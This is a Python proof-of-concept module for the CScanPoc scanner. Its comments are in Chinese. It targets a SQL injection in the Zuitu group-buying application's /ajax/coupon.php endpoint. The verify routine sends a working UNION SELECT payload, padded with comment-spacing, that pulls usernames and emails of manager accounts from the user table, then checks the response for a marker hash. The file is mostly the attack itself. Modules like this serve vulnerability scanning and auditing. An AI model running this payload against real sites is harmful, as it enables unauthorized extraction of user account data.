# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Zuitu_0014' # 平台漏洞编号，留空
    name = '最土团购SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-05'  # 漏洞公布时间
    desc = '''
        最土团购 /ajax/coupon.php?action=consume&secret=8&id=2 php+数字类型注射漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/2245/' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=75525
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09043c3b-72fe-4e92-905a-e6d1196793ce'
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/ajax/coupon.php?action=consume&secret=8&id=2%27%29/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat%280x31,0x3a,username,0x3a,md5%2812%29,0x3a,email,0x3a%29,8,9,10,11,9999999999,13,14,15/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23" 

            code,head,res,errcode,_=hh.http(url)
                       
            if code==200 and 'c20ad4d76fe97759aa27a0c99bff6710' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()